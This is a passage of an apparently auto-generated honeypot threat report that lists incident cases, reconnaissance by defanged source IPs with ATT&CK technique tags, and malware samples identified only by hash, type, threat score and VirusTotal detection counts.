| IR-e456d3ddb067 | HIGH | `175.195.238[.]137` | 2026-10-08 10:22 | Y | 6 | 0 | `T1078` |
| IR-a2ecd63f08ae | HIGH | `175.195.238[.]137` | 2026-10-08 10:24 | Y | 4 | 0 | `T1078 · T1110.001` |
| IR-49df86f44df6 | HIGH | `20.115.209[.]228` | 2026-10-08 10:24 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-e8340357f3ed | HIGH | `20.115.209[.]228` | 2026-10-08 10:25 | Y | 0 | 0 | `T1078 · T1592` |
| IR-20a41e304df5 | HIGH | `118.145.82[.]180` | 2026-10-08 10:26 | Y | 0 | 0 | `T1078 · T1592` |
| IR-b95d7561c8bb | HIGH | `23.249.18[.]174` | 2026-10-08 10:28 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-bbd6d8f83285 | HIGH | `23.249.18[.]174` | 2026-10-08 10:28 | Y | 0 | 0 | `T1078 · T1592` |
| IR-14dfc64ccfc6 | HIGH | `107.150.117[.]219` | 2026-10-08 10:32 | Y | 0 | 0 | `T1078` |
| IR-b92783938d2c | HIGH | `107.150.117[.]219` | 2026-10-08 10:32 | Y | 2 | 0 | `T1078` |
| IR-8cf12e9c15da | HIGH | `218.51.148[.]194` | 2026-10-08 10:56 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-68644e41f59d | HIGH | `218.51.148[.]194` | 2026-10-08 10:56 | Y | 0 | 0 | `T1078 · T1592` |
| IR-370310aececd | HIGH | `176.53.159[.]196` | 2026-10-08 11:24 | Y | 0 | 0 | `T1078 · T1592` |
| IR-5c8eebb33e47 | HIGH | `102.220.163[.]98` | 2026-10-08 11:24 | Y | 1 | 0 | `T1078 · T1592` |
| IR-7c8e81e5343b | HIGH | `102.220.163[.]98` | 2026-10-08 11:25 | Y | 0 | 0 | `T1078 · T1592` |
| IR-acac7b44210c | HIGH | `165.1.75[.]106` | 2026-10-08 11:54 | Y | 0 | 0 | `T1078 · T1592` |
| IR-74b426f50109 | HIGH | `165.1.75[.]106` | 2026-10-08 11:55 | Y | 7 | 0 | `T1059.004 · T1078 · T1105` |
| IR-f78132c4ad15 | HIGH | `193.112.192[.]91` | 2026-10-08 11:55 | Y | 1 | 0 | `T1078 · T1592` |
| IR-a8ee5f564a19 | HIGH | `193.112.192[.]91` | 2026-10-08 12:00 | Y | 1 | 0 | `T1078 · T1592` |
| IR-ec2f4c0f09d0 | HIGH | `193.112.192[.]91` | 2026-10-08 12:00 | Y | 0 | 0 | `T1078 · T1592` |
| IR-fbef549460cd | HIGH | `106.12.7[.]70` | 2026-10-08 12:00 | Y | 0 | 0 | `T1078 · T1105 · T1592` |
_… 70 more priority case(s) in ir_cases.json_

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `37.114.229[.]73` | **4** | 2026-10-08 08:59 | 2026-10-08 14:57 | 1m | 0 | `T1592` | 🟢 LOW |
| `132.148.30[.]167` | **3** | 2026-10-08 11:08 | 2026-10-08 14:30 | 1m | 0 | `T1592` | 🟢 LOW |
| `124.161.116[.]2` | **2** | 2026-10-08 09:35 | 2026-10-08 10:35 | 0m | 0 | `T1592` | 🟢 LOW |
| `125.134.42[.]214` | **2** | 2026-10-08 09:39 | 2026-10-08 10:39 | 0m | 0 | `T1592` | 🟢 LOW |
| `125.134.42[.]214` | **2** | 2026-10-08 14:47 | 2026-10-08 16:47 | 0m | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]32` | **2** | 2026-10-08 15:49 | 2026-10-08 16:08 | 4m | 0 | `T1592` | 🟢 LOW |
| `14.103.117[.]75` | **2** | 2026-10-08 13:46 | 2026-10-08 14:03 | 4m | 0 | `T1592` | 🟢 LOW |
| `193.112.192[.]91` | **2** | 2026-10-08 11:54 | 2026-10-08 12:02 | 2m | 0 | `T1592` | 🟢 LOW |
| `2.57.122[.]168` | **2** | 2026-10-08 05:40 | 2026-10-08 06:14 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `2.57.122[.]53` | **2** | 2026-10-08 05:09 | 2026-10-08 06:29 | 0m | 0 | `T1592` | 🟢 LOW |
| `3.129.187[.]38` | **2** | 2026-10-08 13:08 | 2026-10-08 14:36 | 0m | 0 | `T1592` | 🟢 LOW |
| `37.114.229[.]73` | **2** | 2026-10-08 04:57 | 2026-10-08 06:57 | 0m | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]143` | **2** | 2026-10-08 03:45 | 2026-10-08 04:01 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `80.94.92[.]234` | **2** | 2026-10-08 09:21 | 2026-10-08 10:24 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `92.118.39[.]50` | **2** | 2026-10-08 13:59 | 2026-10-08 14:12 | 0m | 0 | `T1592` | 🟢 LOW |
| `102.220.163[.]98` | 1 | 2026-10-08 05:24 | 2026-10-08 05:25 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `102.220.163[.]98` | 1 | 2026-10-08 08:24 | 2026-10-08 08:24 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `102.220.163[.]98` | 1 | 2026-10-08 11:24 | 2026-10-08 11:25 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `102.220.163[.]98` | 1 | 2026-10-08 14:24 | 2026-10-08 14:24 | 0s | 0 | `T1592` | 🟢 LOW |
| `103.203.57[.]11` | 1 | 2026-10-08 07:13 | 2026-10-08 07:13 | 0s | 0 | `T1592` | 🟢 LOW |
| `104.155.105[.]87` | 1 | 2026-10-08 07:19 | 2026-10-08 07:19 | 0s | 0 | `T1592` | 🟢 LOW |
| `106.13.176[.]216` | 1 | 2026-10-08 05:42 | 2026-10-08 05:44 | 120s | 0 | `T1592` | 🟢 LOW |
| `107.150.117[.]219` | 1 | 2026-10-08 10:31 | 2026-10-08 10:31 | 0s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]104` | 1 | 2026-10-08 03:42 | 2026-10-08 03:42 | 8s | 0 | `T1592` | 🟢 LOW |
| `113.137.40[.]250` | 1 | 2026-10-08 13:43 | 2026-10-08 13:45 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.190.184[.]184` | 1 | 2026-10-08 13:51 | 2026-10-08 13:53 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.22.244[.]110` | 1 | 2026-10-08 06:24 | 2026-10-08 06:24 | 27s | 0 | `T1592` | 🟢 LOW |
| `117.72.69[.]18` | 1 | 2026-10-08 16:54 | 2026-10-08 16:54 | 0s | 0 | `T1592` | 🟢 LOW |
| `118.121.202[.]149` | 1 | 2026-10-08 07:48 | 2026-10-08 07:50 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.145.213[.]116` | 1 | 2026-10-08 08:18 | 2026-10-08 08:20 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.196.86[.]5` | 1 | 2026-10-08 10:57 | 2026-10-08 10:59 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.106[.]235` | 1 | 2026-10-08 07:39 | 2026-10-08 07:39 | 22s | 0 | `T1592` | 🟢 LOW |
| `121.154.4[.]89` | 1 | 2026-10-08 14:56 | 2026-10-08 14:56 | 30s | 0 | `T1592` | 🟢 LOW |
| `123.117.152[.]61` | 1 | 2026-10-08 03:14 | 2026-10-08 03:16 | 120s | 0 | `T1592` | 🟢 LOW |
| `125.134.42[.]214` | 1 | 2026-10-08 12:46 | 2026-10-08 12:46 | 16s | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]174` | 1 | 2026-10-08 03:45 | 2026-10-08 03:45 | 0s | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]174` | 1 | 2026-10-08 05:49 | 2026-10-08 05:49 | 0s | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]174` | 1 | 2026-10-08 09:30 | 2026-10-08 09:30 | 0s | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]174` | 1 | 2026-10-08 13:42 | 2026-10-08 13:42 | 0s | 0 | `T1592` | 🟢 LOW |
| `132.148.30[.]167` | 1 | 2026-10-08 08:01 | 2026-10-08 08:01 | 4s | 0 | `T1592` | 🟢 LOW |
| `137.184.5[.]188` | 1 | 2026-10-08 14:20 | 2026-10-08 14:21 | 45s | 0 | `T1592` | 🟢 LOW |
| `14.103.107[.]26` | 1 | 2026-10-08 13:45 | 2026-10-08 13:47 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.118[.]150` | 1 | 2026-10-08 07:11 | 2026-10-08 07:13 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.118[.]153` | 1 | 2026-10-08 08:32 | 2026-10-08 08:34 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.54.51[.]226` | 1 | 2026-10-08 04:45 | 2026-10-08 04:46 | 24s | 0 | `T1592` | 🟢 LOW |
| `140.246.70[.]45` | 1 | 2026-10-08 14:35 | 2026-10-08 14:37 | 120s | 0 | `T1592` | 🟢 LOW |
| `160.119.76[.]137` | 1 | 2026-10-08 08:26 | 2026-10-08 08:26 | 0s | 0 | `T1592` | 🟢 LOW |
| `172.104.11[.]34` | 1 | 2026-10-08 08:36 | 2026-10-08 08:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `172.104.210[.]105` | 1 | 2026-10-08 06:36 | 2026-10-08 06:36 | 4s | 0 | `T1592` | 🟢 LOW |
| `175.206.251[.]46` | 1 | 2026-10-08 07:53 | 2026-10-08 07:53 | 26s | 0 | `T1592` | 🟢 LOW |
| `176.115.142[.]81` | 1 | 2026-10-08 03:13 | 2026-10-08 03:13 | 0s | 0 | `T1592` | 🟢 LOW |
| `176.183.224[.]22` | 1 | 2026-10-08 09:17 | 2026-10-08 09:17 | 4s | 0 | `T1592` | 🟢 LOW |
| `177.156.64[.]138` | 1 | 2026-10-08 10:12 | 2026-10-08 10:12 | 0s | 0 | `T1592` | 🟢 LOW |
| `178.132.198[.]200` | 1 | 2026-10-08 06:33 | 2026-10-08 06:33 | 16s | 0 | `T1592` | 🟢 LOW |
| `178.132.198[.]200` | 1 | 2026-10-08 12:53 | 2026-10-08 12:53 | 3s | 0 | `T1592` | 🟢 LOW |
| `178.24.232[.]109` | 1 | 2026-10-08 10:17 | 2026-10-08 10:17 | 0s | 0 | `T1592` | 🟢 LOW |
| `180.76.103[.]111` | 1 | 2026-10-08 13:52 | 2026-10-08 13:54 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.76.114[.]151` | 1 | 2026-10-08 07:40 | 2026-10-08 07:42 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.76.146[.]235` | 1 | 2026-10-08 16:45 | 2026-10-08 16:46 | 85s | 0 | `T1592` | 🟢 LOW |
| `181.46.194[.]251` | 1 | 2026-10-08 03:26 | 2026-10-08 03:26 | 0s | 0 | `T1592` | 🟢 LOW |
| `182.61.20[.]116` | 1 | 2026-10-08 05:04 | 2026-10-08 05:06 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.104.212[.]232` | 1 | 2026-10-08 08:33 | 2026-10-08 08:34 | 20s | 0 | `T1592` | 🟢 LOW |
| `183.201.208[.]25` | 1 | 2026-10-08 07:39 | 2026-10-08 07:41 | 120s | 0 | `T1592` | 🟢 LOW |
| `185.191.236[.]38` | 1 | 2026-10-08 09:48 | 2026-10-08 09:48 | 1s | 0 | `T1592` | 🟢 LOW |
| `193.112.192[.]91` | 1 | 2026-10-08 03:12 | 2026-10-08 03:14 | 120s | 0 | `T1592` | 🟢 LOW |
| `193.112.192[.]91` | 1 | 2026-10-08 05:24 | 2026-10-08 05:26 | 120s | 0 | `T1592` | 🟢 LOW |
| `193.112.192[.]91` | 1 | 2026-10-08 16:23 | 2026-10-08 16:25 | 120s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `193.8.186[.]29` | 1 | 2026-10-08 16:05 | 2026-10-08 16:05 | 0s | 0 | `T1592` | 🟢 LOW |
| `194.195.210[.]47` | 1 | 2026-10-08 14:35 | 2026-10-08 14:35 | 3s | 0 | `T1592` | 🟢 LOW |
| `195.96.139[.]225` | 1 | 2026-10-08 11:26 | 2026-10-08 11:26 | 0s | 0 | `T1592` | 🟢 LOW |
| `20.127.148[.]95` | 1 | 2026-10-08 06:27 | 2026-10-08 06:27 | 0s | 0 | `T1592` | 🟢 LOW |
| `20.169.50[.]187` | 1 | 2026-10-08 08:32 | 2026-10-08 08:32 | 9s | 0 | `T1592` | 🟢 LOW |
| `200.59.88[.]136` | 1 | 2026-10-08 06:39 | 2026-10-08 06:39 | 10s | 0 | `T1592` | 🟢 LOW |
| `201.94.150[.]106` | 1 | 2026-10-08 05:41 | 2026-10-08 05:41 | 0s | 0 | `T1592` | 🟢 LOW |
| `211.199.37[.]187` | 1 | 2026-10-08 10:15 | 2026-10-08 10:15 | 29s | 0 | `T1592` | 🟢 LOW |
| `213.177.179[.]80` | 1 | 2026-10-08 09:56 | 2026-10-08 09:56 | 10s | 0 | `T1592` | 🟢 LOW |
| `217.199.144[.]48` | 1 | 2026-10-08 12:42 | 2026-10-08 12:42 | 0s | 0 | `T1592` | 🟢 LOW |
| `222.96.89[.]220` | 1 | 2026-10-08 09:04 | 2026-10-08 09:04 | 24s | 0 | `T1592` | 🟢 LOW |
| `3.130.168[.]2` | 1 | 2026-10-08 05:26 | 2026-10-08 05:26 | 0s | 0 | `T1592` | 🟢 LOW |
| `34.156.220[.]56` | 1 | 2026-10-08 06:49 | 2026-10-08 06:49 | 6s | 0 | `T1592` | 🟢 LOW |
| `34.52.167[.]231` | 1 | 2026-10-08 06:51 | 2026-10-08 06:51 | 0s | 0 | `T1592` | 🟢 LOW |
| `35.187.111[.]95` | 1 | 2026-10-08 07:53 | 2026-10-08 07:53 | 1s | 0 | `T1592` | 🟢 LOW |
| `35.187.41[.]80` | 1 | 2026-10-08 06:36 | 2026-10-08 06:37 | 11s | 0 | `T1592` | 🟢 LOW |
| `37.114.229[.]73` | 1 | 2026-10-08 02:57 | 2026-10-08 02:57 | 18s | 0 | `T1592` | 🟢 LOW |
| `39.104.64[.]139` | 1 | 2026-10-08 11:59 | 2026-10-08 11:59 | 8s | 0 | `T1592` | 🟢 LOW |
| `42.51.33[.]162` | 1 | 2026-10-08 13:14 | 2026-10-08 13:16 | 120s | 0 | `T1592` | 🟢 LOW |
| `43.139.108[.]227` | 1 | 2026-10-08 15:23 | 2026-10-08 15:25 | 120s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]152` | 1 | 2026-10-08 04:06 | 2026-10-08 04:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]157` | 1 | 2026-10-08 10:07 | 2026-10-08 10:08 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.156.129[.]172` | 1 | 2026-10-08 09:57 | 2026-10-08 09:57 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.33.14[.]5` | 1 | 2026-10-08 09:33 | 2026-10-08 09:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.115[.]134` | 1 | 2026-10-08 05:45 | 2026-10-08 05:45 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]110` | 1 | 2026-10-08 13:34 | 2026-10-08 13:34 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]252` | 1 | 2026-10-08 04:39 | 2026-10-08 04:39 | 1s | 0 | `T1592` | 🟢 LOW |
| `45.79.5[.]11` | 1 | 2026-10-08 08:35 | 2026-10-08 08:35 | 6s | 0 | `T1592` | 🟢 LOW |
| `5.58.0[.]143` | 1 | 2026-10-08 06:18 | 2026-10-08 06:18 | 0s | 0 | `T1592` | 🟢 LOW |
| `58.221.60[.]25` | 1 | 2026-10-08 15:03 | 2026-10-08 15:05 | 120s | 0 | `T1592` | 🟢 LOW |
| `59.28.174[.]77` | 1 | 2026-10-08 14:35 | 2026-10-08 14:36 | 21s | 0 | `T1592` | 🟢 LOW |
| `62.60.130[.]201` | 1 | 2026-10-08 13:06 | 2026-10-08 13:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.62.156[.]212` | 1 | 2026-10-08 06:38 | 2026-10-08 06:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]17` | 1 | 2026-10-08 06:30 | 2026-10-08 06:30 | 2s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]51` | 1 | 2026-10-08 05:02 | 2026-10-08 05:02 | 4s | 0 | `T1592` | 🟢 LOW |
| `64.89.160[.]135` | 1 | 2026-10-08 08:44 | 2026-10-08 08:44 | 0s | 0 | `T1592` | 🟢 LOW |
| `65.49.1[.]132` | 1 | 2026-10-08 04:01 | 2026-10-08 04:01 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]76` | 1 | 2026-10-08 12:33 | 2026-10-08 12:33 | 2s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]83` | 1 | 2026-10-08 08:15 | 2026-10-08 08:15 | 15s | 0 | `T1592` | 🟢 LOW |
| `69.5.169[.]182` | 1 | 2026-10-08 04:04 | 2026-10-08 04:04 | 0s | 0 | `T1592` | 🟢 LOW |
| `76.87.150[.]155` | 1 | 2026-10-08 08:13 | 2026-10-08 08:13 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-10-08 04:09 | 2026-10-08 04:09 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-10-08 14:01 | 2026-10-08 14:01 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.90.185[.]16` | 1 | 2026-10-08 06:39 | 2026-10-08 06:39 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.90.185[.]16` | 1 | 2026-10-08 15:21 | 2026-10-08 15:21 | 0s | 0 | `T1592` | 🟢 LOW |
| `79.124.56[.]214` | 1 | 2026-10-08 15:11 | 2026-10-08 15:11 | 0s | 0 | `T1592` | 🟢 LOW |
| `79.98.115[.]13` | 1 | 2026-10-08 12:00 | 2026-10-08 12:00 | 12s | 0 | `T1592` | 🟢 LOW |
| `84.201.243[.]44` | 1 | 2026-10-08 16:54 | 2026-10-08 16:54 | 0s | 0 | `T1592` | 🟢 LOW |
| `84.54.71[.]132` | 1 | 2026-10-08 12:44 | 2026-10-08 12:46 | 120s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]13` | 1 | 2026-10-08 06:37 | 2026-10-08 06:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `89.21.67[.]178` | 1 | 2026-10-08 04:04 | 2026-10-08 04:04 | 0s | 0 | `T1592` | 🟢 LOW |
| `92.115.187[.]184` | 1 | 2026-10-08 15:32 | 2026-10-08 15:32 | 0s | 0 | `T1592` | 🟢 LOW |
| `93.123.109[.]6` | 1 | 2026-10-08 04:42 | 2026-10-08 04:42 | 0s | 0 | `T1592` | 🟢 LOW |
| `93.123.109[.]6` | 1 | 2026-10-08 10:42 | 2026-10-08 10:42 | 0s | 0 | `T1592` | 🟢 LOW |
| `93.177.151[.]72` | 1 | 2026-10-08 09:56 | 2026-10-08 09:56 | 11s | 0 | `T1592` | 🟢 LOW |
| `94.154.43[.]196` | 1 | 2026-10-08 10:49 | 2026-10-08 10:49 | 7s | 0 | `T1592` | 🟢 LOW |
| `94.154.43[.]57` | 1 | 2026-10-08 04:26 | 2026-10-08 04:26 | 30s | 0 | `T1592` | 🟢 LOW |
| `94.154.43[.]69` | 1 | 2026-10-08 05:01 | 2026-10-08 05:02 | 29s | 0 | `T1592` | 🟢 LOW |
| `95.221.180[.]119` | 1 | 2026-10-08 08:38 | 2026-10-08 08:38 | 12s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `05af569c3595b01e...` | 84/100 | 🔴 HIGH | **37/75** 🔴 |
| `062ba629c7b2b914b289c8da0573c179fe86f2cb1f70a31f9a1400d563c3042a` | ELF Binary (Linux executable) (x86-64 64-bit) | `062ba629c7b2b914...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` | ELF Binary (Linux executable) (ARM 32-bit) | `07c0a0af63dde8dc...` | 86/100 | 🔴 HIGH | **40/75** 🔴 |
| `094d2147548839ba5ed36d884983aaf14bd7ae650095dec96a1cf537d3b23b48` | ELF Binary (Linux executable) (x86-64 64-bit) | `094d2147548839ba...` | 45/100 | 🟡 MEDIUM | **39/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` | Bash Script | `0fad00ddec16b67f...` | 70/100 | 🔴 HIGH | **25/75** 🔴 |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `13960b7e69159907f67f84ce6398d29f73686602ef2c36d837237288f4fe8785` | Bash Script | `13960b7e69159907...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `1946ee7ec655de32199ce87390699db1e18d80438bdf01f3b813a929e5cce4e6` | ELF Binary (Linux executable) (MIPS 32-bit) | `1946ee7ec655de32...` | 58/100 | 🟡 MEDIUM | **45/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e5e56d2ffc990b1dd966e12a02d89d7dcad92c2f23c34834fbfa8c792d56520` | Unknown binary | `1e5e56d2ffc990b1...` | 22/100 | 🟢 LOW | **30/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 38/100 | 🟢 LOW | **21/75** 🔴 |
| `1ff7c192f591fe63fae453eb8a91da94b276376d3880e3078c3c5a20ba6b45ab` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ff7c192f591fe63...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
